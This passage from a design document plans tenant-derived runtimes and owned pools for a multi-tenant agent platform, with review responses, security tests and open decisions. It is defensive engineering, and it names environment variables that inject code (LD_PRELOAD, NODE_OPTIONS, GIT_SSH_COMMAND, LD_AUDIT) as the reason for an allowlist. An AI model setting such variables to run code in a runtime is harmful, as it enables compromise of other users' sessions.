| DF-14 | F-17.6.27 | Medium | §17.6 states that a seeded runtime or pool can carry `tenantAccess`, and nothing implements it. `BootstrapRequest` has no such field, and neither bootstrap handler makes a grant call. A seed therefore holds no access rows. That is harmless while DF-2 stands, and it stops every session once DF-2 closes. | `BootstrapRequest`, `bootstrap.go`, `bootstrap_resources.go`, and `tests/testinfra/kind/install.sh`. `pkg/embedded/stack/runtimes.go` grants runtimes alone. Read. | DR-1 |

F-5.2.67 (High) stands for pools, and this design adds that the same gate covers `runtimeRef`, `isolationProfile`, `sessionPolicy`, warm count, and `drain`. DR-1 refuses all of them to `tenant-admin` on a shared pool. EG-9's tenant pool overlay remains the path for egress and git settings.

## Changes requested of other design documents

None of these edits has been made.

| Document | Request | Why |
| :-- | :-- | :-- |
| `tenant-scoping-identity-design.md` | Under "Pods with no per-session policy", and in the "A concurrent pool" scenario and decision 15's cost: replace "a derived runtime with `sessionPolicy.maxConcurrentSessions: 1`" with a derived runtime and its owned pool at that value, under a grant, and replace "a `platform-admin` creates" with a `tenant-admin` holding a grant. | DF-6 makes the current sentence false, and the route changes hands. |
| The same | Under "Residual risks", **Label edits on a sharing path**: name `PUT /v1/admin/derived-runtimes/{name}` alongside the route it names, and note that DR-1 removes a `tenant-admin` from the existing route. | The route changes. |
| The same | Under "Fail closed" in TS-3: no change to the rule. Add DR-8 to the readers of `runtimeAuthorizedForCaller`'s gate, in the dependency notes. | DR-8 depends on it. |
| The same | Under "A session's environment", add a tenant-view miss on any name to the runtime-dependent checks that run again on the final row, for an experiment or `PreRoute` rewrite and for a delegated child. | The rewrite happens after admission. |
| `egress-and-git-design.md` | Under "Scopes and who manages them", replace "Tenant admins cannot create runtimes or pools" with the grant's rule, and add `tenantDerivedRuntimes` to the gates row and to EG-9's write path. | It becomes false once DR-4 and DR-5 land. |
| The same | "Pod models", the "Tenant-owned pool" row: state that a label stamped at creation conflicts with `AdmitTenantPin` and with **Pinned idle inventory**, and adopt `lenny.dev/served`. | It is a shipped enforcement point, and an owned non-recycling pool drains its own pods without this. It belongs with `ownerTenantId` in EG-9. |
| The same | State who sets the ceiling, warm-up policy, and `tenantEgressProfiles` on a tenant-created pool: a template pool's values, copied. State that `ownerTenantId` has no proposal in `proposals/`, because draft 0111 is not there. | That design assumes a platform admin wrote each pool. |
| The same | Under "Reserved for other designs", add `owner_tenant_id`, `template_pool`, and `pod_runtime_ref` on the pool row. | Stored format. |
| The same | Under "Tenant pool overlays", for a pool a grant entry names and for its owned pools: a write lowering a `tenantOverride` flag succeeds, the extending part of any tenant's overlay stops applying, and `runtime.base_changed` goes out. The owned-only rows read as `none` unless the grant entry lists them. | The current refusal lets an overlay block a platform write, against R6, and a copied flag opens rows the operator did not consider. |
| The same | Under "Client proxy profile", limit a tenant-set environment variable to an allowlist of names the chart ships, the proxy and trust variables. | A proxy profile's variable otherwise sets what the runtime loads, and a denylist stays open: `LD_PRELOAD`, `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `PATH`, and `LD_AUDIT` all run code. No such rule exists there. |
| `security-oversight-design.md` | Add `derivedRuntimes` to the SO-2 record, the weakening list, and the "Enforcement" table. Add the `derivedRuntimes` section to "Posture" and the grant to `gates`. State that `verbatimClientFiles: forbid` also forbids `workspaceFiles`. | R7. |

`user-credential-delivery-design.md` needs no edit. Its refusal on `maxConcurrentSessions > 1` reads the owned pool's value as it reads any pool's, and its attacker row for a tenant admin able to change `workspaceDefaults` already states this reach.

## Specification sections affected

- §4.2 **Multi-tenancy:** and the classification table: the tenant-scoped row, and the removal of `tenant-admin` writes on platform-global records.
- §4.6.1 and §4.6.3: the owner label at creation and `podRuntimeRef`.
- §4.7.10 **Runtime supervisor.**: running setup commands at the agent UID, on the existing `CH-SUPERVISE`.
- §5.1 **Inheritance Rules**, **Normative Merge Algorithm**, and **Derived Runtime Instantiation**: the missing rows, the live merge for tenant-derived runtimes, the fallback statement, and what a runtime's `sessionPolicy` does. **Base runtime mutability**: the tenant-derived exception. **`publishedMetadata` Field**: the visibility rule. Name grammar.
- §5.2 **Tenant pinning:**, **Pinned idle inventory.**, and **Pool Taxonomy**: owned pools and `lenny.dev/served`.
- §7.5 **Command policy:** and **Security model:**: the scope of the exemption, and where commands run.
- §8.3: the intersection stated in code terms.
- §10.2: the permission matrix, the new permission, and **Runtime and pool scoping clarification**.
- §10.5 **`RuntimeUpgrade` State Machine**: owned pools.
- §10.6: runtime reach before selectors, and the `allow-all` text that names a tag no record carries.
- §10.7: which pools an experiment can name, and what its effects reach.
- §11.2: `maxOwnedPods` as a platform-held bound.
- §11.7: the new events.
- §12.3, §12.8, and §12.9: the tables, erasure, and classification.
- §13.2.6: an owned pool's profile comes from its template.
- §14.1 **Runtime workspace defaults.**: tenant-written commands get no exemption, and rule 4 does not apply where the tenant view is wired.
- §15.1: the routes, the codes, the deletion rules for a runtime and a tenant, `retire`, and the removal of the `tenant-admin` clauses on `PUT` rows.
- §16: bounds and base-status metrics, with label cardinality stated.
- §17.2: the label webhooks.
- §17.6 and §17.8.2: the Helm values, the default for an absent `tenantAccess` on the seed, and preflight's sizing with `maxOwnedPodsTotal`.
- §24: `lenny-ctl` commands.

## Proposals and dependencies

| Label | Proposal | Contents |
| :-- | :-- | :-- |
| DR-1 | Shared-record boundary | Removes `tenant-admin` writes on platform-global runtimes and pools, including the permissions, reads grants on session, discovery, and delegation paths, limits experiments to a pool's single tenant, implements the seed's `tenantAccess`, reserves `--`, and limits names to 63 characters. Closes DF-1, DF-2, DF-9, DF-10, and DF-14, and the remainder of F-5.2.67 that EG-9's overlay does not cover. |
| DR-2 | Pods for derived runtimes | `podRuntimeRef` on the CRD and pool row, every `Runtime` read in the Sandbox controller, and the §5.1 text on fallback and `sessionPolicy`. It also covers a pool on a platform derived runtime. Closes the derived half of DF-3, DF-5, and DF-6, and DF-7 for platform-derived runtimes. |
| DR-3 | Setup command identity | Runs setup commands at the agent UID through the runtime supervisor on sidecar pods. Closes DF-4 for the adapter's identity. |
| DR-4 | Tenant runtime records | The table, tenant-view interface and the holders that change type, `ErrTenantScopedName`, grant, prefix, permission, routes, field rules, Helm values, erasure, and classification. Closes DF-13, the table half of DF-12, and DF-7 for tenant-derived runtimes. |
| DR-5 | Owned pools | The template copy and its propagation, `ownedOverlays`, `lenny.dev/served`, the bounds, the PoolScalingController clamp, tenant operations, and tenant suspension and deletion. |
| DR-6 | Base lifecycle | The live merge against base and grant, `baseStatus`, the outbox, retirement, emergency, and the deletion rule. Closes DF-8. |
| DR-7 | Oversight and records | The guardrail, posture, and events. |
| DR-8 | Interactions | Environment warnings, the experiment re-check on the final row, and delegation resolution. |

These land early, because a stored format, a wire contract, or a shipped enforcement point would otherwise need rework: the `--` reservation in DR-1, `podRuntimeRef` in DR-2, and `lenny.dev/served` with `ownerTenantId` in EG-9. DR-1, DR-2, and DR-3 stand on their own and fix today's tree, whether or not the rest lands.

| Proposal | Depends on | Why |
| :-- | :-- | :-- |
| DR-1 | None | It should land first, because it closes a Critical defect |
| DR-2 | None | |
| DR-3 | None | |
| DR-4 | DR-1, EG-9, and TS-3 | The name rule, the write path and gate model, and the fail-closed gate |
| DR-4 (tenant defaults step, files and commands) | DR-3 | Neither a tenant command nor a base command reading a tenant file can run at the adapter's UID |
| DR-5 | DR-2, DR-4, and EG-9 | The pod path, the records, and `ownerTenantId` with the label rule |
| DR-6 | DR-4 and DR-5 | The merge and pools it acts on |
| DR-7 | DR-4, and SO-1 and SO-2, whichever lands second adding the case | The role and the record |
| DR-8 | DR-4, TS-1, and TS-3 | The checks on the final row |

Decision 15's route needs DR-1, DR-2, DR-4 with neither default flag, DR-5, and TS-1. It does not need DR-3. A platform-created derived runtime needs DR-2 alone, so decision 15 has an operator's route before the rest lands. No `EG-`, `TS-`, or `SO-` proposal depends on a DR proposal, apart from the requests above.

## Documentation

Each proposal carries the documentation for its own surface. Pages state behaviour with no section numbers, and they land after the specification text they describe.

| Page | Change |
| :-- | :-- |
| `operator-guide/tenant-derived-runtimes.md` (new) | Owns the grant, template pools, budgets, retirement, emergency, capacity headroom, and the costs above. |
| `operator-guide/multi-tenancy.md` | Corrects what `runtime_tenant_access` does, removes tenant writes on shared records, and links the new page. |
| `getting-started/concepts.md`, **Derived runtimes** | Corrects the restrict-only statements, and states that a derived runtime needs a pool. |
| `runtime-author-guide/runtime-configuration.md` | States where setup commands run after DR-3, and which fields a tenant can set. |
| `api/admin.md`, the error reference, and `reference/configuration.md` | The routes, codes, and Helm values. |
| `operator-guide/lenny-ctl.md` | The new commands. |
| `reference/glossary.md` | Entries for tenant-derived runtime, owned pool, template pool, and derivation grant. |
| "Tenant configuration" in the `egress-and-git-design.md` chapter | How a tenant admin creates a derived runtime for an environment, and that default files hold no secrets. |

## Tests

Each proposal turns this list into tests with `// spec:` annotations at the tiers `test-coverage.md` maps. No test exists yet.

### Tier 0: static

- The schemas of the new routes and the CRD fields validate. The session-path holders compile with the tenant-view interface and no plain `Store`.

### Tier 1: unit

- Every row of the field tables: accepted, refused, and narrow, for each `sessionPolicy` field.
- Name and prefix grammar, including `a--b--x` and a trailing `-`, prefix mismatch, 63-character limit, platform refusal of `--`, and `ErrTenantScopedName` from `Store.Get`.
- The merge against base and grant, for each row of "Base changes", including an emptied set.
- `ExperimentVariantSource`: effects reach an owned pool or a sole grantee's pool, a shared pool is untouched, and one tenant's malformed set leaves other tenants' variants applied.
- `AdmitTenantPin` and `markPinnedIdle` across owned and shared pools, served and unserved, recycling and not.
- Budget arithmetic at the boundary, including a raise refused at 19 active pods with `maxOwnedPods: 20`, a raise to a sum equal to the bound, a lowering that passes, warming and `sdk_connecting` pods counted once, `terminated` Sandboxes not counted, a tenant's pods on shared pools not counted, and a `ClaimSlot` on an occupied pod exempt, and the clamp on the PoolScalingController formula and `initialMinWarm`.
- A tenant schema with a `file:` `$ref`, a non-compiling schema, and an oversized schema are refused at write.

### Tier 2: component

- The PoolScalingController renders `podRuntimeRef` and the owner, the controller creates a pod from the base's `Runtime` resource, a missing base fails closed, and an SDK-warm base warms its owned pool as SDK-warm.
- The webhook admits the owner label at creation and refuses every other tenant change.

### Tier 3: contract

- The route bodies refuse unknown fields, the error codes match §15.1, and `GET /v1/admin/derived-runtimes/{name}` reports `baseStatus`.
- `CH-SUPERVISE` carries a setup run with the DR-3 outcome reports.

### Tier 4: integration

- Row-level security: a query with no context sees no row, tenant `globex`'s context sees none of `acme`'s, and `InAllTenants` sees both.
- A create writes the runtime and pool together, and a failed pool write leaves no runtime.
- Concurrent creates cannot exceed `maxRuntimes` or `maxOwnedPods`, a claim at the bound answers `QUOTA_EXCEEDED`, and a grant write cannot push the sum past `maxOwnedPodsTotal`.
- A template write copies to owned pools and bumps each generation, a flag-lowering write succeeds and stops an owned overlay's extension, a base write succeeds with incompatible derived runtimes present, and retirement moves through its states.
- Each session surface refuses a `--` name it cannot resolve, and `setupCommandPolicy.shell: false` reaches the adapter for a tenant-derived runtime.
- A platform `PUT` and `warm-count` on an owned pool succeed. A delegation policy's deletion guard sees its own tenant's reference, and another tenant's reference neither blocks the delete nor appears in the answer.
- A grant entry's `retireAt` moves its runtimes through retirement, an emergency write takes effect at once, and `DELETE .../tenant-access/{tenantId}` answers `409` while the entry is live. With `enabled` false, a narrowing grant write passes and a raise is refused.
- A `DELETE` with live sessions changes nothing. Suspension drains owned pools, and resuming restores them. Tenant deletion and erasure remove the table, grant, and pools, and a consumed prefix stays refused.

### Tier 5: end to end on Kind

- A seeded install with no `tenantAccess` starts a session on its seeded runtime, and the embedded stack starts one on its CRD-only pool.
- Decision 15's scenario: a concurrent base, an owned one-session pool, and a session with E's full policy.
- Warm pods stay in inventory on an owned non-recycling pool, a served pod drains, and a recycling owned pool reuses a pod for its owner within the reserved hold and drains it afterwards. A non-empty `warm_stop_reasons` drains served idle pods.

### Tier 7: load

- Many concurrent creates and session starts across tenants, with the lock on the grant row under race detection.

### Tier 8: chaos

- A failed read of the tenant table fails a session create closed. A failed scan does not fail a platform base write, and its outbox row retries until `runtime.base_changed` goes out.

### Tier 9: security

- DF-1: a `tenant-admin` holding a grant, and a custom role naming either permission, gets `403` on each field of the runtime and pool `PUT`, and on `drain`. A custom role write naming either permission is refused.
- DF-9: a `tenant-admin` naming a shared pool or another tenant's pool as a variant gets the unknown-pool answer on `POST` and `PUT`, a `variant.Runtime` it cannot reach is refused, a `PATCH` on a `platform-admin`'s experiment on a platform pool answers `403`, and the controller leaves that pool's warm count and `SandboxWarmPool` unchanged.
- DF-2: a tenant with no grant cannot create on, discover, or delegate to a platform runtime.
- Each surface answers identically for another tenant's name and for an absent one: admin reads, `GET /v1/runtimes`, metadata, `/v1/models`, session create, delegate, experiment write, and `pool` pin.
- DF-4, on a one-session pod: a setup command's process runs at the agent UID, and cannot read the service account token or write the credential volume.
- A default command outside the base's allowlist, or under a policy with `shell: true`, is refused at write and at bind. A tenant file on a path a base file holds is refused, and a tenant default on a base with no supervisor is refused.
- `allowSetupCommands` or `allowWorkspaceFiles` set false makes a runtime holding that default refuse new sessions.
- A tenant-set variable outside the chart's allowlist, such as `NODE_OPTIONS` or `GIT_SSH_COMMAND`, is refused on an owned pool, whatever the copied flag says.
- A `--` name from another tenant creates no admission rate-limit entry for its pool, and `verbatimClientFiles: forbid` refuses a default file.
- Revoking access after an experiment's write refuses its sessions and delegated children on the final row, for a runtime with no `--`. A tenant-admin's `PUT` on an experiment naming a platform pool answers `403`.
- A flag-lowering write emits `runtime.base_changed` to a tenant with an overlay and no grant. A tenant `PUT` does not clear `warm_stop_reasons`.
- A pod of an owned pool cannot be claimed for another tenant, even when the gateway's first layer is skipped.
- An SO-2 forbid refuses a write, suspends existing runtimes, and a removal waits out the delay.

### Tier 10: conformance

- Reference runtimes run setup commands from the runtime image after DR-3.

### Tier 11: documentation

- The page's examples validate against the schemas and the chart, and each error code resolves.

## Review of revision 1

An independent review read revision 1. Each finding was checked against the text and the tree. No finding was rejected outright, and the "Result" column states where the fix differs from the one proposed.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| H1, experiments drain shared pools | Holds. Fix changed. | `ListPoolConfigs`, `ResolveVariantRoles`, and the routes read as stated. "Delete" means the `SandboxWarmPool`, because the template and the row remain. An owned-only rule would end experiments on every deployment with no grant, against R8, because `tenant-admin` cannot create a pool. The rule is a pool's single tenant, with `tenant-admin` writes limited to owned pools, and it moves to DR-1 because the defect exists today. |
| H2, a missed site does not fail closed | Holds. | Applied, and the lint is replaced by the type change. `messages.go` was not traced for its not-found branch, and the type change covers it either way. |
| H3, default files are code | Holds. Fix widened. | `allowWorkspaceFiles` and refusal of a base path applied. The proposed refusal on a supervisor-less base with setup commands becomes refusal on any supervisor-less base, because an embedded runtime reading a tenant file shares the adapter's identity. This is one rule in place of a conditional. |
| M1, an overlay blocks a template write | Holds. | Applied for owned pools. An overlay on the template itself keeps EG-9's refusal, which is recorded as a residual. |
| M2, "no new surface" is false | Holds. | `ownedOverlays` applied, and the deny rule requested. |
| M3, custom roles keep DF-1 open | Holds. Fix narrowed. | Both permissions leave `RolePermissions(RoleTenantAdmin)`, which is the ceiling. The second list is `AllPermissions()`, which `platform-admin` needs, so it stays. |
| M4, R5 is not met | Holds. Fix smaller. | `maxOwnedPods` replaces `maxWarmPods` and the `max_concurrent_sessions` prerequisite. With the sum of grants at or below the total, only grant writes take the global lock, and pool writes need none. R5 is reworded. |
| M5, grant changes have no effect | Holds. | Applied through the rows in "Base changes". |
| M6, an allowlist under a shell does not bound | Holds. | Applied. |
| Minor 1, `podRuntimeRef` scope | Holds. | DF-3's closure narrowed, and the grant write checks the `Runtime` resource. |
| Minor 2, `resolveSDKWarm` | Holds. | Applied. |
| Minor 3, admin readers | Holds. | `validatePoolUpdate` reads the runtime unconditionally, so `PUT` and `warm-count` answer `400`. Applied, and `runtimeRestartable` added. |
| Minor 4, the DF-4 test and claim | Holds. | §13.1 states the concurrent-pod read. Test scoped, and DR-3's claim limited. |
| Minor 5, prefix grammar | Holds. Fix widened. | A trailing `-` also collides: prefix `a-` with suffix `x`, and prefix `a` with suffix `-x`, both give `a---x`. |
| Minor 6, erasure frees a prefix | Holds. | `consumed_name_prefixes` added. |
| Minor 7, template retirement and `DELETE` order | Holds. | A template is held by its grant entries and retires through a grant write, which needs no new mechanism. `DELETE` checks first, and a tenant `drain` route is added. |
| Minor 8, a failed scan loses the event | Holds. | Outbox row added. |
| Minor 9, tenant suspension and deletion | Holds. | Rules added, reusing `ForceZeroMinWarm`. |
| Minor 10, the owner on `SandboxTemplate` | Holds. | Added. |
| DF-4 rating, DR-3's limit, and the false comments | Hold. | `setup.go` and `pkg/embedded/stack/runtimes.go` say what was reported. Recorded in DF-2 and DF-4. |

## Review of revision 2

An independent review read revision 2. Each finding was checked against the text and the tree. No finding was rejected outright, and the "Result" column states where the fix differs from the one proposed.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| M1, the policy guard crosses tenants | Holds. Fix narrowed. | `delegationPolicyRuntimeDependents` and the route read as stated. The guard takes the policy's tenant and reads the tenant view, which is granted platform rows plus that tenant's rows. Reading all platform rows, as proposed, would still let an ungranted platform runtime block a delete and disclose its name, so that is filed as DF-13. |
| M2, `maxOwnedPods` does not bound | Holds. | Applied as proposed. |
| M3, a granted tenant can block a template write | Holds. | Applied, the residual removed, and the egress request changed. |
| Minor 1, `runtimeOptionsSchema` | Holds. Fix widened. | `Loaders` in `jsonschema/v5` v5.3.1 holds `file`, and `validateAgainstSchema` returns no error on a compile failure. `$schema` and `$id` are refused as well, because each can change what gets loaded. |
| Minor 2, tenant-reachable list calls | Holds. Fix widened. | `validatePoolProxyDialect` lists runtimes in the same way and is added. |
| Minor 3, `checkVariantIsolation` | Holds. | Applied. |
| Minor 4, `PATCH` | Holds. | Applied. It also corrects DR-1's claim that `PATCH` names a pool. |
| Minor 5, DF-9's routing evidence | Holds. | Corrected, and `variant.Runtime` is bounded at write. DF-9's rating stands, because it rests on the controller's effects. With `variant.Runtime` alone, a `tenant-admin` keeps a working experiment before DR-5, which lowers decision 13's cost. |
| Minor 6, per-tenant retirement has no carrier | Holds. Fix smaller. | `retireAt` on the grant entry carries it, and the emergency form uses the same `PUT`. `DELETE .../tenant-access/{tenantId}` answers `409` while an entry is live, in place of a new route form and a date column on the access table. |
| Minor 7, `enabled: false` | Holds. | Applied. |
| Minor 8, prefix reassignment | Holds. | Applied. |
| Minor 9, `clientProfile` denylist | Holds. | Allowlist applied, and the request changed. |
| Minor 10, `verbatimClientFiles` | Holds in one direction. | `verbatimClientFiles: forbid` now forbids `workspaceFiles`. The reverse was not applied, because a forbid on default files says nothing about the client config files `netagent` writes. |
| Minor 11, `type` and `deploymentModel` | Holds. Fix smaller. | `applyCRDFields` mirrors no `deploymentModel`. The RuntimeReconciler mirrors it, so a resolve needs no read of the `Runtime` resource. |
| Minor 12, commands re-run on rebuild | Holds. | §7.3 step 3e says so. Recorded as a residual, because filtering needs a per-command source on the stored plan. The false sentence is removed. |
| Minor 13, rate-limit order, `bootstrapMinWarm`, and the recycling test | Holds. | `requireAdmissionRateLimit` runs first in `create.go`, so the check moves ahead of it. `bootstrapMinWarm` is refused, and the recycling test and its rule state the reserved hold. |

## Review of revision 3

An independent review read revision 3. Each finding was checked against the text and the tree. No finding was rejected outright, and the "Result" column states where the fix differs from the one proposed.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| M1, the count reads the wrong source | Holds. | `derivePodStates`, `upsertSQL`, and `syncMirror` read as stated. The Sandbox list is the source, so no lag bound is needed. |
| M2, `variant.Runtime` is checked only at write | Holds. Fix widened. | `routeExperiment` runs before `enforceSetupCommandPolicy`, and `ResolvePool` reads no runtime store. The refusal covers a plain create as well as a rewrite, because a create on an ungranted name would otherwise continue, which leaves DF-2 open. §14.1 rule 4 therefore ends where the view is wired. |
| M3, an overlay rule with no notice | Holds. | Applied. |
| Minor 1, `<=` against `<` | Holds. | The write is refused at a sum equal to the bound, and `ClaimSlot` on an occupied pod is exempt. |
| Minors 2 and 3, dates and `409` | Holds. | Applied, with DP9's exception stated and the template `DELETE` included in it. |
| Minor 4, per-tenant `force` | Holds. | Applied. |
| Minor 5, `PUT` then `PATCH` | Holds. | Applied. |
| Minor 6, the finalizer | Holds. | Recorded as a residual, because holding the finalizer needs the reconciler to read tenant rows. |
| Minor 7, overlay gaps | Holds. Fix changed. | One sentence covers the drop, and `egressProfile` is added. EG-9 fixes the first group at pod creation. `warmUp` is read per decision, so it stops at the next decision instead of at a pod roll. |
| Minor 8, normalization and `Registered` | Holds. | `mirror` and `runsSupervisor` read as stated. The RuntimeReconciler records the condition in `registered`, so a resolve still reads only the row. |
| Minor 9, `enabled: false` | Holds. | `POST` is refused, and the sentence stands. |
| Minor 10, who drains | Holds. Fix smaller. | `warm_stop_reasons` replaces `owner_suspended` as the one column, read through the existing `ForceZeroMinWarm`. Reasons keep a tenant resume from clearing a retirement. `suspended_by` is added to the stored formats. |

## Review of revision 4

An independent review read revision 4. Each finding was checked against the text and the tree. No finding was rejected.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| M1, the refusal stops a fresh install | Holds. Fix changed. | `BootstrapRequest` and the handlers read as stated. §17.6 already specifies `tenantAccess` on seeded runtimes and pools, so DR-1 implements that rather than adding a list, and DF-14 records the gap. An absent value grants a sole seeded tenant and no one otherwise, because a default to every seeded tenant would over-grant on a multi-tenant seed. The unpinned rule is applied as proposed. |
| M2, `terminated` exhausts the budget | Holds. | `plan.Compute` and the state table read as stated. `failed` leaves through `draining`, so counting it does not leak. |
| Minor 1, `MaxWarm` | Holds. | `pinnedOverBound` uses `MaxWarm` less the target. Applied. |
| Minor 2, no pod roll | Holds. | Pending reported, recorded as a residual rather than a new drain, and the `egressProfile` case stated. |
| Minor 3, DP9 | Holds. | Applied, with the emergency retirement as the way past it. |
| Minor 4, clearing `suspended_by` | Holds. | A compliant `PUT` clears it, as SO-2's table states for a restored preset. |
| Minor 5, terminal retirement | Holds. | Applied. A cancel remains possible before the date. |

## Review of revision 5

A stop check on revision 5 found no Critical, High, or Major issue in this document. It raised the Minors below, each checked against the text and the tree. None was rejected.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| 1, a seed naming no tenant | Holds. | Migration `0053` inserts `default`. Applied. |
| 2, `helm upgrade` undoes a revocation | Holds. | `bootstrap-job.yaml` runs post-install and post-upgrade. The default applies on create alone, and `--force-update` reapplies only a list. |
| 3, the grant check at every `ResolvePool` | Holds. | Those sites call `ResolvePool` with `row.Pool`. The check is limited to the points that claim a pod. |
| 4, soft-deleted pools | Holds, with one correction. | `PoolPolicy`'s comment says `found` is false for a soft-deleted pool, and the code does not do that: both stores' `Get` return the row and it adds no check. The fix stands, because the rule must not depend on that comment. |
| 5, a re-issued entry | Holds. | Applied. |
| 6, R6 and DP9 | Holds. | Applied. |

## Decisions

These are open for the owner, and the recommendation is the design above.

| # | Decision | Recommendation | Cost of the recommendation | Alternative |
| :-- | :-- | :-- | :-- | :-- |
| 1 | Where tenant records live | A separate tenant-scoped table with a platform-assigned name prefix | Every session-path read changes, a customer's names carry a prefix, and the prefix appears in operator logs and metric labels | A nullable owner on `runtime_definitions`, which is less code and relies on application filtering, or a composite key, which allows any name and needs a global identifier beside it for pods and CRDs |
| 2 | Who turns it on | A per-tenant platform grant listing bases, templates, and budgets | An operator acts for each tenant and each base | A deployment-wide switch over all granted runtimes, which is less work and gives no per-tenant limit |
| 3 | Raising `maxConcurrentSessions` | Lowering only | A tenant wanting higher density asks the operator to raise the template | A ceiling in the grant above the template's value, which moves the acknowledgment to the operator per tenant and adds cost per pod for a tenant wanting it |
| 4 | Tenant defaults | Files and commands each under their own grant flag, off by default, on a supervised base, after DR-3. Commands also need `allowlist` and `shell: false`. | Where a flag is on, a stolen `tenant-admin` runs code at the agent UID in every new session on that runtime, reading `file` tokens and using `inject` tokens. DR-3 is new work. | No tenant defaults in the first version, which serves R2 and removes this cost, and leaves a tenant needing files or tools to ask an operator. Files without commands is no middle ground, because a file is code. |
| 5 | Pool for each runtime | Always an owned pool, with no fallback | One warm pod at least per runtime, while DF-11 stands | A fallback to a non-recycling, one-session base pool, which costs no warm pods and does not serve decision 15's case |
| 6 | Bounding capacity | `maxOwnedPods` per tenant, checked at write and claim, with the sum of grants at or below a deployment total | The bound is a pod count, the count at claim can overshoot, an operator sizes each grant up front, and the namespace `ResourceQuota` stays shared | A dedicated agent namespace for owned pools, with its own quota. That isolates capacity and needs multi-namespace work in `PoolStoreSource`, `ResolvePool`, and the chart |
| 7 | Template values | Copied, and propagated in the platform write's transaction | A platform write touches every owned row, and a widening reaches tenants at once | Read-through at each use, which needs a new merge in each reader |
| 8 | Base retirement | A notice period of 30 days by default, with an emergency path | A platform waits on retirement, and the figure is a judgment | No notice, which strands tenants, or tenants blocking as today, which R6 refuses |
| 9 | A delay on tenant commands at a tenant with a security record | None on create, with a forbid and an immediate event | A stolen `tenant-admin` at a tenant with no forbid has its command run until someone acts | SO-2's weakening delay on each command change, or an approved-digest list like `tokenTrust.allowedRecords`. Each is additive and slows every legitimate change |
| 10 | Service-mode bases | Refused in the first version | A tenant using a service-mode runtime has no derivation, and an environment needing per-session policy still needs an operator | Allowed with a narrow field set. It gives little, because service mode materializes no workspace, and it depends on a per-pool Service whose creator was not established |
| 11 | Public metadata and cards | Refused, and generated cards carry `tenant` | A tenant's agent is not discoverable across organizations | A grant flag with a content-type allowlist, which publishes customer content on the operator's origin |
| 12 | `tenant-admin` writes on shared records | Removed entirely | §10.2's stated ability goes, including a tenant's scaling of a shared pool | Per-tenant overlays on runtime fields. Derived runtimes meet that need, and `egress-and-git-design.md`'s overlay covers egress and git settings |
| 13 | Experiments on pools | A `tenant-admin` names owned pools alone and reachable runtimes, a `platform-admin` names a platform pool whose single tenant is the experiment's, and the controller applies effects under the same test | Until DR-5 a `tenant-admin`'s variant sets `variant.Runtime` alone, with no warm sizing of its own. A base pool shared with another tenant stays over-warmed during an experiment, and an operator cannot run a variant on a shared pool | Owned pools alone, which ends experiments on a deployment with no grant, or a `platform-admin` approval flag on each experiment, which the controller would have to read |
| 14 | Overlay rows only an owned pool has | Read as `none` unless the grant entry's `ownedOverlays` lists them | An operator lists each row per base, a tenant needing its own CA or `gitAccess` asks, and a listed `clientProfile` sets only allowlisted variable names | Follow the copied flags as EG-9 states, which opens rows the operator set the flag without considering |
| 15 | An absent `tenantAccess` on a seeded runtime or pool | Grants `default` when the seed names no tenant, the seed's tenant when it names exactly one, and none when it names several | A seed naming several tenants lists each grant, or its sessions are refused | Every seeded tenant, which is less to write and over-grants, or none, which breaks §4.2's statement that a single-tenant deployer need not think about tenants |
